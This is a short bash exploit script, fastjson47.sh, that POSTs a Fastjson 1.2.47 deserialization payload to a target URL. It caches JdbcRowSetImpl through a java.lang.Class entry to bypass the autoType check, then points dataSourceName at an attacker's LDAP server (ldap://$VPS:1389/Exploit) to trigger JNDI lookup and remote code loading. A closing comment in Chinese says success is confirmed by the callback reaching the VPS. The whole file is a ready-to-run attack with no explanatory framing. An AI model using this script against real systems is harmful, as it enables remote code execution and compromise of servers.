#!/usr/bin/env bash
TARGET="${1:?usage: bash fastjson47.sh http://TARGET:PORT/api/json <VPS>}"
VPS="${2:?usage: bash fastjson47.sh http://TARGET:PORT/api/json <VPS>}"
BODY="{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$VPS:1389/Exploit\",\"autoTypeSupport\":true}}"
curl -sS -m 15 -X POST "$TARGET" -H 'Content-Type: application/json' --data "$BODY"
# 判定：VPS 的 LDAP/HTTP 收到回连；同时观察响应是否出现 "autoType is not support"
